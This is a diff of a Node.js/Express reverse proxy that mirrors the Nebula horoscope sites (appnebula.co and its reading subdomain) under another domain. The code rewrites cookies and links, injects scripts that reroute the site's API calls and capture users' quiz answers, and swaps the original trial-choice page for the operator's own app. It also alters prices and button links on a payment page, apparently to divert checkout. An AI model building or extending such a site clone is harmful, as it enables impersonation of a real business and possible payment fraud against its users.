@@ -6,25 +6,22 @@ const cheerio = require('cheerio');
 const path = require('path');
 const { URL } = require('url');
 const fileUpload = require('express-fileupload');
-const FormData = require('form-data'); // Adiciona FormData para uploads de arquivos
+const FormData = require('form-data');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// URLs de destino
 const MAIN_TARGET_URL = 'https://appnebula.co';
 const READING_SUBDOMAIN_TARGET = 'https://reading.nebulahoroscope.com';
 
-// Configurações para Modificação de Conteúdo
 const USD_TO_BRL_RATE = 5.00;
 const CONVERSION_PATTERN = /\$(\d+(\.\d{2})?)/g;
 
-// Variável para armazenar o texto capturado (mantida, mas a nova abordagem usa localStorage)
+// Variáveis para depuração (mantidas, mas não essenciais para a funcionalidade principal)
 let capturedBoldText = '';
 let lastCaptureTime = 0;
 let isCapturing = false;
 
-// Usa express-fileupload para lidar com uploads de arquivos (multipart/form-data)
 app.use(fileUpload({
     limits: { fileSize: 50 * 1024 * 1024 },
     createParentPath: true,
@@ -32,16 +29,22 @@ app.use(fileUpload({
     preserveExtension: true
 }));
 
-// Middleware para servir arquivos estáticos da build do React
+// --- PASSO 1: Rota específica para servir o SEU React App para `/meu-app/trial-choice` ---
+// ESSA ROTA DEVE VIR ANTES do `express.static` e do proxy principal.
+app.get('/meu-app/trial-choice', (req, res) => {
+    console.log('✅ Servindo React App (index.html) para a rota /meu-app/trial-choice');
+    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
+});
+
+// Middleware para servir arquivos estáticos da build do React (CSS, JS, etc.)
+// Isso deve vir depois de rotas específicas que servem o index.html,
+// mas antes do proxy para evitar que assets do seu app sejam proxyados.
 app.use(express.static(path.join(__dirname, 'dist')));
 
-// API endpoint para obter o texto capturado (mantido, caso seu app.tsx ainda o use para fallback ou debug)
+// API endpoint para obter o texto capturado (mantido para compatibilidade, mas o app.tsx lê direto do localStorage)
 app.get('/api/captured-text', (req, res) => {
     console.log('📡 API /api/captured-text chamada');
     console.log('📝 Texto atual na variável (via backend):', `"${capturedBoldText}"`);
-    console.log('🕐 Último tempo de captura:', new Date(lastCaptureTime).toISOString());
-    console.log('🔄 Está capturando:', isCapturing);
-
     res.json({
         capturedText: capturedBoldText,
         lastCaptureTime: lastCaptureTime,
@@ -50,26 +53,36 @@ app.get('/api/captured-text', (req, res) => {
     });
 });
 
-// Removidas as funções extractTextFromHTML e captureTextDirectly,
-// pois a captura do texto dinâmico será feita no front-end.
-
-// Rota específica para a página customizada de trialChoice
-// AGORA REDIRECIONA PARA A ROTA DO SEU APP REACT
+// --- PASSO 2: Interceptar `/pt/witch-power/trialChoice` e redirecionar para SUA rota do React ---
+// Essa rota também deve vir antes do middleware de proxy principal.
 app.get('/pt/witch-power/trialChoice', async (req, res) => {
-    console.log('\n=== INTERCEPTANDO TRIALCHOICE ===');
+    console.log('\n=== INTERCEPTANDO TRIALCHOICE DO SITE ORIGINAL ===');
     console.log('Timestamp:', new Date().toISOString());
     console.log('URL acessada:', req.url);
-
+    console.log('✅ Redirecionando trialChoice para a rota do SEU app React: /meu-app/trial-choice');
     // Redireciona para a rota do seu app React que renderiza TrialChoice.tsx
     // A escolha do quiz será recuperada no app.tsx via localStorage.
-    console.log('✅ Redirecionando trialChoice para a rota do seu app React: /meu-app/trial-choice');
     return res.redirect(302, '/meu-app/trial-choice');
 });
+
 
 // Middleware Principal do Proxy Reverso
 app.use(async (req, res) => {
     let targetDomain = MAIN_TARGET_URL;
     let requestPath = req.url;
+
+    // --- PASSO 3: EXCLUIR as rotas do SEU React App do proxy ---
+    // É crucial que requisições para URLs do seu próprio app (ex: `/meu-app/trial-choice`)
+    // NÃO sejam proxyadas para o site original. Elas devem ser servidas localmente.
+    if (req.url.startsWith('/meu-app/') || req.url === '/') {
+        console.log(`⚠️ Ignorando requisição para rota do app React no proxy: ${req.url}`);
+        // Se a requisição é para a raiz ou para uma rota do seu app React
+        // e não foi tratada pelas regras `app.get` acima, provavelmente é um asset
+        // que `express.static` deve ter servido. Se chegou aqui, algo está errado
+        // ou é uma rota que não existe no seu app.
+        // O `express.static` acima já deve estar tratando os assets.
+        return res.status(404).send('Recurso não encontrado no seu aplicativo.');
+    }
 
     const requestHeaders = { ...req.headers };
     delete requestHeaders['host'];
@@ -82,17 +95,6 @@ app.use(async (req, res) => {
         requestPath = req.url.substring('/reading'.length);
         if (requestPath === '') requestPath = '/';
         console.log(`[READING PROXY] Requisição: ${req.url} -> Proxy para: ${targetDomain}${requestPath}`);
-        console.log(`[READING PROXY] Método: ${req.method}`);
-
-        if (req.files && Object.keys(req.files).length > 0) {
-            console.log(`[READING PROXY] Arquivos recebidos: ${JSON.stringify(Object.keys(req.files))}`);
-            const photoFile = req.files.photo;
-            if (photoFile) {
-                console.log(`[READING PROXY] Arquivo 'photo': name=${photoFile.name}, size=${photoFile.size}, mimetype=${photoFile.mimetype}`);
-            }
-        } else {
-            console.log(`[READING PROXY] Corpo recebido (tipo): ${typeof req.body}`);
-        }
     } else {
         console.log(`[MAIN PROXY] Requisição: ${req.url} -> Proxy para: ${targetDomain}${requestPath}`);
     }
@@ -104,7 +106,6 @@ app.use(async (req, res) => {
 
         if (req.files && Object.keys(req.files).length > 0) {
             const photoFile = req.files.photo;
-
             if (photoFile) {
                 const formData = new FormData();
                 formData.append('photo', photoFile.data, {
@@ -130,7 +131,6 @@ app.use(async (req, res) => {
             },
         });
 
-        // Lógica de Interceptação de Redirecionamento (Status 3xx)
         if (response.status >= 300 && response.status < 400) {
             const redirectLocation = response.headers.location;
             if (redirectLocation) {
@@ -142,8 +142,6 @@ app.use(async (req, res) => {
                     fullRedirectUrl = redirectLocation;
                 }
 
-                // Esta regra AINDA captura redirecionamentos do SERVIDOR DE DESTINO para /email
-                // E REDIRECIONA PARA A PÁGINA DE ONBOARDING PROXIEDA (não seu app React)
                 if (fullRedirectUrl.includes('/pt/witch-power/email')) {
                     console.log('Interceptando redirecionamento do servidor de destino para /email. Redirecionando para /pt/witch-power/onboarding.');
                     return res.redirect(302, '/pt/witch-power/onboarding');
@@ -162,14 +160,12 @@ app.use(async (req, res) => {
             }
         }
 
-        // Repassa Cabeçalhos da Resposta do Destino para o Cliente
         Object.keys(response.headers).forEach(header => {
             if (!['transfer-encoding', 'content-encoding', 'content-length', 'set-cookie', 'host', 'connection'].includes(header.toLowerCase())) {
                 res.setHeader(header, response.headers[header]);
             }
         });
 
-        // Lida com o cabeçalho 'Set-Cookie': reescreve o domínio do cookie para o seu domínio
         const setCookieHeader = response.headers['set-cookie'];
         if (setCookieHeader) {
             const cookies = Array.isArray(setCookieHeader) ? setCookieHeader : [setCookieHeader];
@@ -182,13 +178,11 @@ app.use(async (req, res) => {
             res.setHeader('Set-Cookie', modifiedCookies);
         }
 
-        // Lógica de Modificação de Conteúdo (Apenas para HTML)
         const contentType = response.headers['content-type'] || '';
         if (contentType.includes('text/html')) {
             let html = response.data.toString('utf8');
             const $ = cheerio.load(html);
 
-            // Reescrever todas as URLs relativas e absolutas
             $('[href], [src], [action]').each((i, el) => {
                 const element = $(el);
                 let attrName = '';
@@ -216,8 +210,6 @@ app.use(async (req, res) => {
                 }
             });
 
-            // Script para reescrever URLs de API dinâmicas no JavaScript
-            // E também adiciona a manipulação do Content-Security-Policy (CSP)
             const proxyHost = req.protocol + '://' + req.get('host');
             $('head').prepend(`
                 <script>
@@ -233,18 +225,14 @@ app.use(async (req, res) => {
                             if (typeof input === 'string') {
                                 if (input.startsWith(readingSubdomainTarget)) {
                                     url = input.replace(readingSubdomainTarget, proxyPrefix);
-                                    // console.log('PROXY SHIM: REWRITE FETCH URL (reading):', input, '->', url);
                                 } else if (input.startsWith(mainTargetOrigin)) {
                                     url = input.replace(mainTargetOrigin, currentProxyHost);
-                                    // console.log('PROXY SHIM: REWRITE FETCH URL (main):', input, '->', url);
                                 }
                             } else if (input instanceof Request) {
                                 if (input.url.startsWith(readingSubdomainTarget)) {
                                     url = new Request(input.url.replace(readingSubdomainTarget, proxyPrefix), input);
-                                    // console.log('PROXY SHIM: REWRITE FETCH Request Object URL (reading):', input.url, '->', url.url);
                                 } else if (input.url.startsWith(mainTargetOrigin)) {
                                     url = new Request(input.url.replace(mainTargetOrigin, currentProxyHost), input);
-                                    // console.log('PROXY SHIM: REWRITE FETCH Request Object URL (main):', input.url, '->', url.url);
                                 }
                             }
                             return originalFetch.call(this, url, init);
@@ -256,10 +244,8 @@ app.use(async (req, res) => {
                             if (typeof url === 'string') {
                                 if (url.startsWith(readingSubdomainTarget)) {
                                     modifiedUrl = url.replace(readingSubdomainTarget, proxyPrefix);
-                                    // console.log('PROXY SHIM: REWRITE XHR URL (reading):', url, '->', modifiedUrl);
                                 } else if (url.startsWith(mainTargetOrigin)) {
                                     modifiedUrl = url.replace(mainTargetOrigin, currentProxyHost);
-                                    // console.log('PROXY SHIM: REWRITE XHR URL (main):', url, '->', modifiedUrl);
                                 }
                             }
                             originalXHRopen.call(this, method, modifiedUrl, async, user, password);
@@ -268,14 +254,11 @@ app.use(async (req, res) => {
                 </script>
             `);
 
-            // REDIRECIONAMENTO CLIENT-SIDE MAIS AGRESSIVO PARA /pt/witch-power/email
-            // ESTE BLOCO ESTÁ CORRETO E SERÁ MANTIDO.
+            // CLIENT-SIDE REDIRECT PARA /pt/witch-power/email (MANTIDO)
             $('head').append(`
                 <script>
                     console.log('CLIENT-SIDE REDIRECT SCRIPT: Initializing.');
-
                     let emailRedirectCheckInterval;
-
                     function handleEmailRedirect() {
                         const currentPath = window.location.pathname;
                         if (currentPath.startsWith('/pt/witch-power/email')) {
@@ -286,40 +269,39 @@ app.use(async (req, res) => {
                             window.location.replace('/pt/witch-power/onboarding');
                         }
                     }
-
                     document.addEventListener('DOMContentLoaded', handleEmailRedirect);
                     window.addEventListener('popstate', handleEmailRedirect);
                     emailRedirectCheckInterval = setInterval(handleEmailRedirect, 100);
-
                     window.addEventListener('beforeunload', () => {
                         if (emailRedirectCheckInterval) {
                             clearInterval(emailRedirectCheckInterval);
                         }
                     });
-
                     handleEmailRedirect();
                 </script>
             `);
 
-            // 🎯 NOVO SCRIPT PARA CAPTURAR A ESCOLHA DO QUIZ NA PÁGINA wpGoal (FRONT-END)
-            // ESTE É O SCRIPT CRÍTICO PARA SALVAR NO LOCALSTORAGE.
+            // --- SCRIPT CORRIGIDO PARA CAPTURAR A ESCOLHA DO QUIZ NA PÁGINA wpGoal (FRONT-END) ---
             if (req.url.includes('/pt/witch-power/wpGoal')) {
                 console.log('Injetando script de captura de quiz na página wpGoal.');
                 $('body').append(`
                     <script>
                         (function() {
+                            // Usamos o seletor exato do seu HTML para os botões de resposta.
                             const answerButtons = document.querySelectorAll('li[data-testid="answer-button"]');
                             console.log('Quiz capture script active. Found ' + answerButtons.length + ' answer buttons.');
 
                             answerButtons.forEach(button => {
                                 button.addEventListener('click', function() {
-                                    const chosenTextElement = this.querySelector('.sc-5303d838-10.gdosuv');
+                                    // Selecionamos o span específico que contém o texto da opção
+                                    const chosenTextElement = this.querySelector('span.sc-5303d838-10.gdosuv');
+                                    
                                     if (chosenTextElement) {
                                         const chosenText = chosenTextElement.textContent.trim();
                                         console.log('Quiz choice captured: ' + chosenText);
                                         localStorage.setItem('nebulaQuizChoice', chosenText); // Salva no localStorage
                                     } else {
-                                        console.warn('Could not find choice text element inside clicked button.');
+                                        console.warn('Could not find the specific text span element inside the clicked button. Check the selector "span.sc-5303d838-10.gdosuv".');
                                     }
                                 });
                             });
@@ -328,7 +310,6 @@ app.use(async (req, res) => {
                 `);
             }
 
-            // MODIFICAÇÕES ESPECÍFICAS PARA /pt/witch-power/trialPaymentancestral
             if (req.url.includes('/pt/witch-power/trialPaymentancestral')) {
                 console.log('Modificando conteúdo para /trialPaymentancestral (preços e links de botões).');
                 $('body').html(function(i, originalHtml) {
